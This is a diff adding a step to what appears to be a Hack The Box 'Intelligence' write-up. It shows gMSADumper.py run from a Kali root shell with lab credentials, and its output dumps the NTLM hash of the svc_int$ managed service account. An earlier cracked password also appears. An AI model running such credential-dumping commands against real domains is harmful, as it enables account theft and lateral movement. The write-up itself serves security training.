@@ -592,3 +592,12 @@ Candidates.#1....: Ms.Jordan -> Money01
 Started: Wed Oct 27 00:58:01 2021
 Stopped: Wed Oct 27 00:59:14 2021
 ```
+
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/gMSADumper]
+└─# python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l intelligence.htb 
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::c699eaac79b69357d9dabee3379547e6
+```
